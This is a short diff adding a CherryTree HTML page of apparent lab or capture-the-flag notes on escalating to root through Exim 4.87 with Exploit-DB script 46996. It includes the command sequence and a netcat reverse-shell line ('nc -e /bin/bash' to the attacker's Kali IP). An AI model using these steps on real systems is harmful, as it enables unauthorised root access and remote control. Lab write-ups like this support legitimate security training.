@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>exim4</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>exim4</h1><br/>Now I run lse.sh and find that the machine is running exim4<br />exim4 --version shows version 4.87<br />exploitdb takes us to <a href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a><br />run dos2unix against the code to “unwindowsify” it<br />put 46996.sh on target box<br /><br />start nc listener<br />/bin/bash 46996.sh -m netcat<br />it will say to wait 5 seconds... and then you get to put in a command<br />you put in nc -e /bin/bash 192.168.11.136 3234          (that is your kali IP)<br />and boom!! root shell!</div></body></html>
